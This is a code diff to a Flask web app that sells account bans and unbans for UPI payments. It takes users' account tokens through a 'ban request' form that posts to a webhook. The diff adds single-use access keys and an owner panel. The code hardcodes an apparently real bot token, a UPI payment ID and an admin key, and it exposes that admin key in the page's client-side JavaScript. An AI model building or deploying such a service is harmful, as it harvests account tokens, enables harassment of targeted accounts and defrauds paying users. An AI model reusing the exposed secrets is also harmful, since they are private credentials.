@@ -1,13 +1,20 @@
 from flask import Flask, request, jsonify, render_template_string
 import requests
 from datetime import datetime
+import random
+import string
 
 app = Flask(__name__)
 
 # ================== CONFIG ==================
 BOT_TOKEN = "8822384225:AAFRhO0m2iXex10zrAO85wVrY3AJ1w5daB4"
 OWNER_ID = "8910330347"
-OWNER_UPI = "9773978195@fam"
+
+# Admin Key for Owner Panel
+ADMIN_KEY = "TITANXPOWER2"
+
+# In-memory storage for generated keys (Render restart hone par reset ho jayega)
+GENERATED_KEYS = set()
 
 # ================== THE HTML WEBPAGE ==================
 HTML_CODE = """
@@ -81,6 +88,15 @@ HTML_CODE = """
     text-align: center; font-size: 24px; color: #ff0033; font-weight: bold;
     margin: 15px 0; padding: 10px; border: 1px dashed #ff0033; border-radius: 8px;
   }
+
+  /* Admin Panel Specific */
+  .admin-box {
+    background: #000; border: 1px solid #ff0033; padding: 15px; border-radius: 8px; margin-bottom: 15px;
+  }
+  .key-display {
+    background: #111; padding: 10px; border: 1px dashed #00ff66; color: #00ff66;
+    text-align: center; font-size: 18px; margin-top: 10px; letter-spacing: 2px;
+  }
 </style>
 </head>
 <body>
@@ -98,6 +114,15 @@ HTML_CODE = """
       <button class="btn" onclick="selectOption('permanent')">PERMANENT ACC BAN (FREE)</button>
       <button class="btn" onclick="selectOption('30days')">30 DAYS BAN (99 RS)</button>
       <button class="btn btn-green" onclick="selectOption('unban')">UNBAN ACC (399 RS)</button>
+    </div>
+
+    <!-- ACCESS KEY VERIFY SCREEN -->
+    <div id="screen-access" class="screen">
+      <h3 style="text-align:center; margin-bottom:15px; color:#00ff66;" id="access-title">ENTER ACCESS KEY</h3>
+      <p class="info-text" id="access-desc">Enter key to proceed</p>
+      <input type="text" id="input-key" placeholder="Enter Access Key" autocomplete="off">
+      <button class="btn btn-green" onclick="verifyKey()">VERIFY & PROCEED</button>
+      <button class="btn" style="border-color:#555;" onclick="showScreen('screen-main')">BACK</button>
     </div>
 
     <!-- TOKEN ENTRY -->
@@ -121,7 +146,7 @@ HTML_CODE = """
 
     <!-- UTR SCREEN -->
     <div id="screen-utr" class="screen">
-      <h3 style="text-align:center; margin-bottom:15px; color:#00ff66;">ENTER UTR / TRANSACTION ID</h3>
+      <h3 style="text-align:center; margin-bottom:15px; color:#00ff66;">ENTER UTR</h3>
       <input type="text" id="input-utr" placeholder="12 digit UTR number" autocomplete="off">
       <button class="btn btn-green" onclick="submitUTR()">SUBMIT UTR</button>
     </div>
@@ -130,15 +155,25 @@ HTML_CODE = """
     <div id="screen-success" class="screen">
       <h2 style="text-align:center; color:#00ff66; margin-bottom:20px; text-shadow:0 0 10px #00ff66;">PAYMENT RECEIVED</h2>
       <p class="info-text" style="color:#fff; font-size:14px;">Now contact owner for access key and provide your UTR.</p>
-      <button class="btn" onclick="window.open('https://t.me/Titantrusted', '_blank')">CONTACT OWNER @Titantrusted</button>
+      <button class="btn" onclick="window.open('https://t.me/Titantrusted', '_blank')">CONTACT OWNER</button>
     </div>
 
     <!-- OWNER PANEL -->
     <div id="screen-owner" class="screen">
       <h3 style="text-align:center; color:#ff0033; margin-bottom:15px;">OWNER PANEL</h3>
-      <button class="btn" onclick="alert('Change 30 Days Price API')">CHANGE 30 DAYS PRICE</button>
-      <button class="btn" onclick="alert('Change Unban Price API')">CHANGE UNBAN PRICE</button>
-      <button class="btn" onclick="alert('Change UPI ID API')">CHANGE UPI ID</button>
+      
+      <div class="admin-box">
+        <p style="color:#fff; font-size:14px; margin-bottom:10px;">30 DAYS BAN ACCESS</p>
+        <button class="btn btn-green" onclick="generateKey('30days')">GENERATE KEY</button>
+        <div id="key-display-30" class="key-display" style="display:none;"></div>
+      </div>
+
+      <div class="admin-box">
+        <p style="color:#fff; font-size:14px; margin-bottom:10px;">UNBAN ACCESS</p>
+        <button class="btn btn-green" onclick="generateKey('unban')">GENERATE KEY</button>
+        <div id="key-display-unban" class="key-display" style="display:none;"></div>
+      </div>
+      
       <button class="btn" style="border-color:#555;" onclick="showScreen('screen-main')">BACK TO WEB</button>
     </div>
 
@@ -162,7 +197,6 @@ setInterval(() => {
   }
 }, 50);
 
-// App Logic
 let currentType = '';
 let timerInterval;
 
@@ -174,18 +208,49 @@ function showScreen(id) {
 function selectOption(type) {
   currentType = type;
   if (type === 'permanent') {
+    // Permanent Ban ke liye direct token
     document.getElementById('token-title').innerText = "PERMANENT BAN - ENTER TOKEN";
     showScreen('screen-token');
   } else if (type === '30days') {
-    document.getElementById('pay-price').innerText = "PAY 99 RS";
-    startPayment('https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=upi://pay?pa=9773978195@fam%26am=99');
+    // 30 Days Ban ke liye pehle access key
+    document.getElementById('access-title').innerText = "ENTER 30 DAYS ACCESS KEY";
+    document.getElementById('access-desc').innerText = "Buy key from owner or pay 99 Rs below";
+    showScreen('screen-access');
   } else if (type === 'unban') {
-    document.getElementById('pay-price').innerText = "PAY 399 RS";
-    startPayment('https://api.qrserver.com/v1/create-qr-code/?size=200&data=upi://pay?pa=9773978195@fam%26am=399');
+    // Unban ke liye pehle access key
+    document.getElementById('access-title').innerText = "ENTER UNBAN ACCESS KEY";
+    document.getElementById('access-desc').innerText = "Buy key from owner or pay 399 Rs below";
+    showScreen('screen-access');
   }
 }
 
-function startPayment(qrUrl) {
+function verifyKey() {
+  const key = document.getElementById('input-key').value.trim();
+  if(!key) return alert("Enter key");
+
+  fetch('/api/verify_key', {
+    method: 'POST', headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({ key: key, action: currentType })
+  })
+  .then(res => res.json())
+  .then(data => {
+    if(data.valid) {
+      // Key sahi hai, ab token maango
+      document.getElementById('token-title').innerText = "KEY VERIFIED - ENTER TOKEN";
+      showScreen('screen-token');
+    } else {
+      // Key galat hai, payment par bhejo
+      if(currentType === '30days') {
+        startPayment('https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=upi://pay?pa=9773978195@fam%26am=99', 99);
+      } else {
+        startPayment('https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=upi://pay?pa=9773978195@fam%26am=399', 399);
+      }
+    }
+  });
+}
+
+function startPayment(qrUrl, amount) {
+  document.getElementById('pay-price').innerText = "PAY " + amount + " RS";
   document.getElementById('qr-image').src = qrUrl;
   showScreen('screen-pay');
   startTimer(600); // 10 mins
@@ -215,7 +280,7 @@ function submitToken() {
     method: 'POST', headers: {'Content-Type': 'application/json'},
     body: JSON.stringify({ type: 'BAN_REQUEST', token: token, action: currentType })
   }).then(() => {
-    alert("BAN REQUEST SENT!");
+    alert("BAN REQUEST SENT! WAIT FOR ADMIN.");
     showScreen('screen-main');
   });
 }
@@ -229,6 +294,23 @@ function submitUTR() {
     body: JSON.stringify({ type: 'PAYMENT', utr: utr, action: currentType })
   }).then(() => {
     showScreen('screen-success');
+  });
+}
+
+// Admin Panel Generate Key
+function generateKey(type) {
+  fetch('/api/generate_key', {
+    method: 'POST', headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({ type: type, admin_key: "TITANXPOWER2" })
+  })
+  .then(res => res.json())
+  .then(data => {
+    if(data.key) {
+      const displayId = type === '30days' ? 'key-display-30' : 'key-display-unban';
+      const el = document.getElementById(displayId);
+      el.innerText = data.key;
+      el.style.display = 'block';
+    }
   });
 }
 
@@ -251,6 +333,27 @@ document.getElementById('logo').addEventListener('click', () => {
 @app.route('/')
 def home():
     return render_template_string(HTML_CODE)
+
+@app.route('/api/verify_key', methods=['POST'])
+def verify_key():
+    data = request.json
+    key = data.get('key')
+    # Agar key generated list me hai, toh valid
+    if key in GENERATED_KEYS:
+        GENERATED_KEYS.remove(key) # Ek baar use hone ke baad delete
+        return jsonify({"valid": True})
+    return jsonify({"valid": False})
+
+@app.route('/api/generate_key', methods=['POST'])
+def generate_key():
+    data = request.json
+    if data.get('admin_key') != ADMIN_KEY:
+        return jsonify({"error": "Unauthorized"}), 401
+
+    # Random 8 character key generate karo
+    key = "TITAN-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
+    GENERATED_KEYS.add(key)
+    return jsonify({"key": key})
 
 @app.route('/api/webhook', methods=['POST'])
 def webhook():
